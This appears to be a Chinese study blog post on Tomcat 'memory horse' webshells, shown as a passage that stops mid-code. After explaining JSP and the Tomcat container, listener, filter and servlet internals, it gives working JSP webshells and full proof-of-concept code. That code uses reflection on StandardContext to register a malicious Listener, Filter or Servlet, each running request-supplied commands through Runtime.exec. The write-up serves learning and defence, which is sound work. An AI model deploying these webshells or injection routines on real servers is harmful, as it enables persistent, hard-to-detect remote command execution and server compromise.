# 写在前面
首先还是感谢师傅：
[https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/](https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/)
[https://goodapple.top/archives/1355](https://goodapple.top/archives/1355)
真的tql，我何时能像他们一样优秀。

# 一些东西
## jsp
JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。
就是为了实现动态业务专门搞了个这么个逻辑。

语法啥的就是：
```java
<% 代码片段 %>

<jsp:scriptlet>
   代码片段
</jsp:scriptlet>

```
这两部分用法一样

```java
<html>
<body>
<h2>Hello World!!!</h2>
<% out.println("GoodBye!"); %>
</body>
</html>
```
会回显 Hello World GoodyBye。
声明
可以声明一个或多个变量，供java代码使用
```java
<%! 声明  %>

<jsp:declaration>
   代码片段
</jsp:declaration>
```
```java
<html>
<body>
<h2>Hello World!!!</h2>
<%! String s= "GoodBye!"; %>
<% out.println(s); %>
</body>
</html>
```
用法类似。
jsp表达式
```java
<%= 表达式  %>

<jsp:expression>
   表达式
</jsp:expression>

```
```java
<html>
<body>
<h2>Hello World!!!</h2>
<p>
<% String name = "Feng"; %>
username:<%=name%>
</p>
</body>
</html>
```
还有：

| <%@ page ... %> | 定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等 |
| --- | --- |
| <%@ include ... %> | 包含其他文件 |
| <%@ taglib ... %> | 引入标签库的定义，可以是自定义标签 |

```java
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```
这里对页面作了声明：
language="java"：指定页面的脚本语言为Java。
contentType="text/html; charset=UTF-8"：指定页面的内容类型为text/html，字符编码为UTF-8。这表示该页面将以HTML格式呈现，并使用UTF-8编码进行文本处理。
pageEncoding="UTF-8"：指定页面的编码为UTF-8。这确保在处理页面中的文本时使用正确的字符编码。

注释：
```java
<%-- 注释内容 --%>

```
### 几大内置对象
| request | javax.servlet.http.HttpServletRequest | 获取用户请求信息 |
| --- | --- | --- |
| response | javax.servlet.http.HttpServletResponse | 响应客户端请求，并将处理信息返回到客户端 |
| response | javax.servlet.jsp.JspWriter | 输出内容到 HTML 中 |
| session | javax.servlet.http.HttpSession | 用来保存用户信息 |
| application | javax.servlet.ServletContext | 所有用户共享信息 |
| config | javax.servlet.ServletConfig | 这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数 |
| pageContext | javax.servlet.jsp.PageContext | JSP 的页面容器，用于访问 page、request、application 和 session 的属性 |
| page | javax.servlet.jsp.HttpJspPage | 类似于 Java 类的 this 关键字，表示当前 JSP 页面 |
| exception | java.lang.Throwable | 该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象 |

# jsp马
简单来说，就是在jsp的java代码里面执行危险操作
```java
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>

```
有回显
```java

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
 
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
    String line;
    PrintWriter printWriter = response.getWriter();
    printWriter.write("<pre>");
    while ((line = bufferedReader.readLine()) != null){
        printWriter.println(line);
    }
    printWriter.write("</pre>");
 
}
%>
```
# tomcat
Tomcat Server大致可以分为三个组件，Service、Connector、Container.
service可以算作是顶层容器，包含多个connector和container。
Connector：Connector 是处理网络连接和请求的组件。它负责监听指定的端口，并根据协议（如 HTTP、HTTPS）接受客户端的请求。每个 Connector 都有一个或多个 ProtocolHandler，用于处理特定的协议。
Container：Container 是处理请求的组件，它负责管理和处理来自客户端的请求。
Container包含四种子容器：Engine、Host、Context和Wrapper，均继承自container。
Engine
可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。

Host
可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。

Context
又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(/)。相当于路由吧
warpper
是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。
应该是某个路由下的业务。

# 三大组件
## servlet
用于处理请求的动态资源
加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例
初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象
处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求
销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作。
第一次访问，会调用init(),之后会调用service，删除调用destroy。


自己写一个servlet就要继承接口Servelet，又要重写五个方法，于是可以继承GenericServlet类，只需重写service方法就行。
```java
package Servlet;
 
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
 
@WebServlet("/hello")
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String parameter = req.getParameter("name");
        PrintWriter writer = resp.getWriter();
        writer.write("Hello "+parameter+"!");
        writer.close();
    }
}
```
我也不知道怎么注册，反正先理解一下这个意思吧
servletconfig
```java
package Servlet;
 
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
 
@WebServlet("/config")
public class Config_Servlet extends HttpServlet {
 
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        //设置响应编码
        resp.setContentType("text/html; charset=UTF-8");
        //获取ServletConfig
        ServletConfig servletConfig = getServletConfig();
        //获取Servlet名称
        String name = servletConfig.getServletName();
        PrintWriter writer = resp.getWriter();
        writer.write("Servlet名称为："+name);
        writer.close();
    }
}
```
为servlet配置一些信息
ServletContext
就是Servlet 上下文
上下文参数：
```java
<web-app>
  <display-name>Archetype Created Web Application</display-name>
  //配置上下文初始化参数name
  <context-param>
    <param-name>name</param-name>
    <param-value>Feng</param-value>
  </context-param>
  <context-param>
    <param-name>age</param-name>
    <param-value>18</param-value>
  </context-param>
</web-app>
```
```java
package Servlet;
 
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Enumeration;
 
@WebServlet("/context")
public class Context_Servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType("text/html; charset=UTF-8");
        PrintWriter writer = resp.getWriter();
 
        ServletContext servletContext = getServletContext();
 
        Enumeration<String> initParamerNames = servletContext.getInitParameterNames();
        while(initParamerNames.hasMoreElements()){
            String ParamerName = initParamerNames.nextElement();
            String Paramer = servletContext.getInitParameter(ParamerName);
            writer.write(ParamerName+"的值为："+Paramer+"<br/>");
        }
 
        writer.close();
    }
}
```
看一看，了解一下就行。。
## filter
```java
package Filter;
 
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
 
@WebServlet("/hello")
public class Hello_Servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        PrintWriter writer = resp.getWriter();
        writer.write("Hello World!");
        writer.close();
    }
}
```
控制资源放行的这么个玩意
## Listener
监听某个端口，并根据变化作响应。






一般就是Listener->Filter->Servlet这么个加载顺序。


# 三种context
## ServletContext
不多说了

## ApplicationContext
对上面context接口的实现。
## standardcontext
ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。
# tomcat的内存🐎
依赖：
```java
<dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>9.0.55</version>
</dependency>
```
目的是注册一个恶意listener。
有：

- ServletContextListener
- HttpSessionListener
- ServletRequestListener

这三种listener，
这其中ServletRequestListener是最适合用来作为内存马的。
访问任意资源，都会触发ServletRequestListener#requestInitialized()
## 注册servlet
你mlgb，这破玩意环境我tm搞了一天，cnm，sb东西，sm玩意。
讲讲怎么搞吧。
首先创建一个新项目，maven的。
![微信截图_20230609195254.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686311583383-1cd00318-6aaf-4798-8cb1-7151ea603502.png#averageHue=%233d4246&clientId=ubd266f6a-788e-4&from=paste&height=718&id=ua4e7f8e2&originHeight=897&originWidth=623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56674&status=done&style=none&taskId=u1a7c5458-b257-49b5-97c9-71b336f9e8c&title=&width=498.4)
右击选择这玩意，添加框架支持，选择web应用程序。
然后就跳出web下面的一些列东西，我选择将其移到src下面，
同时写了个（其实是嫖大佬的）servlet
```java
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/hello")
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String parameter = req.getParameter("name");
        PrintWriter writer = resp.getWriter();
        writer.write("Hello "+parameter+"!");
        writer.close();
    }
}

```
去webxml注册：
```java
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>MyServlet</servlet-name>
        <servlet-class>org.example.MyServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>MyServlet</servlet-name>
        <url-pattern>/hello</url-pattern>
    </servlet-mapping>
</web-app>

```
然后部署到tomcat，成功实现业务。
nm这么简单的东西，网上愣是没啥地方讲，找了好久才找到解决方法。
```java
package Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@WebListener
public class Shell_Listener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }
}
```
注册listener
```java
<listener>
        <listener-class>Listener.Shell_Listener</listener-class>
    </listener>
```
弹计算器。
## 跟进调试
StandardContext#fireRequestInitEvent
这里调用了我们的listener，看一下
```java
public boolean fireRequestInitEvent(ServletRequest request) {

        Object instances[] = getApplicationEventListeners();

        if ((instances != null) && (instances.length > 0)) {

            ServletRequestEvent event =
                    new ServletRequestEvent(getServletContext(), request);

            for (Object instance : instances) {
                if (instance == null) {
                    continue;
                }
                if (!(instance instanceof ServletRequestListener)) {
                    continue;
                }
                ServletRequestListener listener = (ServletRequestListener) instance;

                try {
                    listener.requestInitialized(event);
                } catch (Throwable t) {
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.requestListener.requestInit",
                            instance.getClass().getName()), t);
                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);
                    return false;
                }
            }
        }
        return true;
    }
```
将listener以数组形式全部返回。
```java
public Object[] getApplicationEventListeners() {
        return applicationEventListenersList.toArray();
    }
private List<Object> applicationEventListenersList = new CopyOnWriteArrayList<>();
```
存储listener并以数组形式返回。

```java
public void addApplicationEventListener(Object listener) {
        applicationEventListenersList.add(listener);
    }
```
添加listener。
StandardContext是Apache Tomcat中的一个类，它实现了Context接口，用于表示Web应用程序的上下文（Context）。
获取StandardContext类
```java
public final void invoke(Request request, Response response)
        throws IOException, ServletException {

        // Select the Context to be used for this Request
        Context context = request.getContext();
```
StandardHostValve#invoke
同样可以通过jsp获取
```java
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
```
```java
<%
	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%>
 
```
```java
<%
	Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%>
```
## 内存马流程实现

1. 获取StandardContext上下文
2. 实现一个恶意Listener
3. 通过StandardContext#addApplicationEventListener方法添加恶意Listener

## 坑点
很sb的一个事，改个输出路径的事，md网上一个解决方案都没有。
![微信截图_20230612133831.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686548320976-472a203a-0e9c-467e-9139-12907ba44de7.png#averageHue=%233d4145&clientId=u768f67ea-74c3-4&from=paste&height=793&id=u1834ae91&originHeight=991&originWidth=1272&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62165&status=done&style=none&taskId=u7c2d32d4-cfb9-4460-aae5-2cba777dff2&title=&width=1017.6)
这里工件的输出目录要选择你要放jsp的地方。
## 继续分析内存🐎
在web目录下放我们的Listener.jsp
```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>

<%!
  public class Shell_Listener implements ServletRequestListener {

    public void requestInitialized(ServletRequestEvent sre) {
      HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
      String cmd = request.getParameter("testcmd");
      if (cmd != null) {
        try {
          Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
          e.printStackTrace();
        } catch (NullPointerException n) {
          n.printStackTrace();
        }
      }
    }

    public void requestDestroyed(ServletRequestEvent sre) {
    }
  }
%>
<%
  Field reqF = request.getClass().getDeclaredField("request");
  reqF.setAccessible(true);
  Request req = (Request) reqF.get(request);
  StandardContext context = (StandardContext) req.getContext();

  Shell_Listener shell_Listener = new Shell_Listener();
  context.addApplicationEventListener(shell_Listener);
%>
```
访问，输入?testcmd=calc
# Filter
先来个实现恶意方法的filter
```java
package Filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/*")
public class Shell_Filter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }
}
```
webxml注册
```java
<filter>
        <filter-name>Shell_Filter</filter-name>
        <filter-class>Filter.Shell_Filter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>Shell_Filter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```
不知道为啥弹了两次计算器.
破案了，chain.dofilter又调用了一次filter。
复制一下大佬的栈分析
```java
doFilter:11, Shell_Filter (Filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:687, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```
ApplicationFilterChain#internalDoFilter
```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {

        // Call the next filter if there is one
        if (pos < n) {
            ApplicationFilterConfig filterConfig = filters[pos++];
            try {
                Filter filter = filterConfig.getFilter();

                if (request.isAsyncSupported() && "false".equalsIgnoreCase(
                        filterConfig.getFilterDef().getAsyncSupported())) {
                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
                }
                if( Globals.IS_SECURITY_ENABLED ) {
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                        ((HttpServletRequest) req).getUserPrincipal();

                    Object[] args = new Object[]{req, res, this};
                    SecurityUtil.doAsPrivilege ("doFilter", filter, classType, args, principal);
                } else {
                    filter.doFilter(request, response, this);
                }
            } catch (IOException | ServletException | RuntimeException e) {
                throw e;
            } catch (Throwable e) {
                e = ExceptionUtils.unwrapInvocationTargetException(e);
                ExceptionUtils.handleThrowable(e);
                throw new ServletException(sm.getString("filterChain.filter"), e);
            }
            return;
        }
```
通过filterConfig.getFilter();获得恶意filter。
filterconfig来源：
```java
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
```
filters是一个applicationfilterconfig数组。
在StandardWrapperValve
invoke方法，有个
```java
ApplicationFilterChain filterChain =
                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
```
跟进看一下
```java
public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
 
        ...
        // Request dispatcher in use
        filterChain = new ApplicationFilterChain();
 
        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
 
        // Acquire the filter mappings for this Context
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();
 
        ...
 
        String servletName = wrapper.getName();
 
        // Add the relevant path-mapped filters to this filter chain
        for (FilterMap filterMap : filterMaps) {
            
            ...
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            ...
 
            filterChain.addFilter(filterConfig);
        }
 
        ...
 
        // Return the completed filter chain
        return filterChain;
    }
```
new ApplicationFilterChain创建一个空对象
wrapper.getParent();获取standcontext对象
```java
FilterMap filterMaps[] = context.findFilterMaps();
```
获取存储filters的map。
```java
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
```
根据名字获取FilterConfig，
```java
filterChain.addFilter(filterConfig);
```
最后放到filter里面。
```java
void addFilter(ApplicationFilterConfig filterConfig) {

        // Prevent the same filter being added multiple times
        for(ApplicationFilterConfig filter:filters)
            if(filter==filterConfig)
                return;

        if (n == filters.length) {
            ApplicationFilterConfig[] newFilters =
                new ApplicationFilterConfig[n + INCREMENT];
            System.arraycopy(filters, 0, newFilters, 0, n);
            filters = newFilters;
        }
        filters[n++] = filterConfig;

    }
```
可以看到filterConfig被添加到了filters数组里面。
跟进creat_filterchain
filterconfig
![微信截图_20230612142835.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686551328029-36b9fa85-d9bb-4c52-bd8f-365a524fe285.png#averageHue=%233d4143&clientId=u768f67ea-74c3-4&from=paste&height=174&id=u12735949&originHeight=217&originWidth=561&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15525&status=done&style=none&taskId=ue563fffd-f2ef-47e7-8add-cdf32cba5ef&title=&width=448.8)
包含上下文信息。
filterDef
![微信截图_20230612143107.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686551476780-dfdcba62-48c5-47c0-b0dc-2667cfa6179a.png#averageHue=%233c4042&clientId=u768f67ea-74c3-4&from=paste&height=174&id=u0a19d149&originHeight=217&originWidth=596&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13834&status=done&style=none&taskId=ud885ad2b-2d54-404d-88af-bbbfdf3e429&title=&width=476.8)
存放类、名，对应xml中<filter>标签。
```java
<filter>
        <filter-name>Shell_Filter</filter-name>
        <filter-class>Filter.Shell_Filter</filter-class>
    </filter>
```
filterDefs
这是个hashmap，键值对存储filterdef
![](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686551593300-db3b7810-9433-44e9-a382-34773abc1c7c.png#averageHue=%23343e4a&clientId=u768f67ea-74c3-4&from=paste&id=u85ea8d8a&originHeight=102&originWidth=495&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uf9405381-1826-4d8c-8c51-5e0eba8cf5d&title=)
filterMaps
![微信截图_20230612143505.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686551714406-8e018c8b-f6f4-4933-bb99-3c0f59b60b82.png#averageHue=%233c3f42&clientId=u768f67ea-74c3-4&from=paste&height=157&id=ub61dd125&originHeight=196&originWidth=638&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13327&status=done&style=none&taskId=uc591fc44-3666-46fc-9a06-b0e62fe38bf&title=&width=510.4)
filterMaps中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<filter-mapping>标签。
```java
<filter-mapping>
        <filter-name>Shell_Filter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```
思路：
获取StandardContext对象
创建恶意Filter
使用FilterDef对Filter进行封装，并添加必要的属性
创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中
使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中。

完整poc
```java
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%
  ServletContext servletContext = request.getSession().getServletContext();
  Field appContextField = servletContext.getClass().getDeclaredField("context");
  appContextField.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
  Field standardContextField = applicationContext.getClass().getDeclaredField("context");
  standardContextField.setAccessible(true);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>

<%! public class Shell_Filter implements Filter {
  @Override
  public void init(FilterConfig filterConfig) throws ServletException {

  }

  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    String cmd = request.getParameter("filterjspcmd");
    if (cmd != null) {
      try {
        Runtime.getRuntime().exec(cmd);
      } catch (IOException e) {
        e.printStackTrace();
      } catch (NullPointerException n) {
        n.printStackTrace();
      }
    }
    chain.doFilter(request, response);
  }

  @Override
  public void destroy() {

  }
}
%>

<%
  Shell_Filter filter = new Shell_Filter();
  String name = "CommonFilter";
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName(name);
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);


  FilterMap filterMap = new FilterMap();
  filterMap.addURLPattern("/*");
  filterMap.setFilterName(name);
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);


  Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
  Configs.setAccessible(true);
  Map filterConfigs = (Map) Configs.get(standardContext);

  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
  filterConfigs.put(name, filterConfig);
%>
```
解释一下：
获取StandardContext对象
```java
ServletContext servletContext = request.getSession().getServletContext();
  Field appContextField = servletContext.getClass().getDeclaredField("context");
  appContextField.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
  Field standardContextField = applicationContext.getClass().getDeclaredField("context");
  standardContextField.setAccessible(true);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```
首先获取ServletContext对象，接着获取context对象，该字段存储了ApplicationContext，私有变可访问。
然后反射get方法，获取servlectContext的一个context字段，，即获取ApplicationContext对象。
然后获取applicationContext的context字段，即StandardContext对象。
接着构造恶意filter
```java
<%! public class Shell_Filter implements Filter {
  @Override
  public void init(FilterConfig filterConfig) throws ServletException {

  }

  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    String cmd = request.getParameter("filterjspcmd");
    if (cmd != null) {
      try {
        Runtime.getRuntime().exec(cmd);
      } catch (IOException e) {
        e.printStackTrace();
      } catch (NullPointerException n) {
        n.printStackTrace();
      }
    }
    chain.doFilter(request, response);
  }

  @Override
  public void destroy() {

  }
}
%>
```
继承接口要重写方法，简单的idea生成。

```java
Shell_Filter filter = new Shell_Filter();
  String name = "CommonFilter";
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName(name);
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);
```
用filterDef封装恶意Filter，添加到standarContext。
名字任意，类用函数自动获取。
```java
FilterMap filterMap = new FilterMap();
  filterMap.addURLPattern("/*");
  filterMap.setFilterName(name);
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);
```
配置FilterMap。

```java
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
  Configs.setAccessible(true);
  Map filterConfigs = (Map) Configs.get(standardContext);

  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
  filterConfigs.put(name, filterConfig);
```
获取filterconfigs字段，设置applicationFilterConfig字段，并且放入filterConfigs。
# servlet🐎
```java
package Servlet;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet("/shell")
public class Shell_Servlet implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("servletcmd");
        if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
```
先实现一个恶意servlet。
生命周期：
加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例
初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象
处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求
销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作。
加载代码
```java
...
 
if (ok) {
                if (!listenerStart()) {
                    log.error(sm.getString("standardContext.listenerFail"));
                    ok = false;
                }
            }
 
 
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString("standardContext.managerFail"), e);
                ok = false;
            }
 
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString("standardContext.filterFail"));
                    ok = false;
                }
            }
 
            // Load and initialize all "load on startup" servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString("standardContext.servletFail"));
                    ok = false;
                }
            }
 
 
            // Start ContainerBackgroundProcessor thread
            super.threadStart();
        }if (ok) {
                if (!listenerStart()) {
